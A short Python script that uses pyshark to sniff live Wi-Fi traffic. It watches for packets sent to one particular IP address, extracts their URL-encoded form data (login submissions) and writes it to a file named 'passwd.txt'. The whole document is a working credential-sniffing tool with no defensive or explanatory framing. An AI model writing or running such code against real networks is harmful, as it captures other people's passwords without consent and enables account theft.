import pyshark as psk
# 256837
capture = psk.LiveCapture(interface='Wi-Fi')
print ("탐지 중 ...")
for p_ in capture.sniff_continuously():
    try:
        ip_data = p_['ip'].dst
    except KeyError as e:
        pass
    else:
        if ip_data == "211.115.80.-":
            try:
                packet_data = p_['URLENCODED-FORM']
            except KeyError as e:
                pass
            else:
                print (packet_data)
                packet_data = str(packet_data)
                with open("passwd.txt", "w") as f:
                    f.write(packet_data)
                    f.close()
                capture.close()

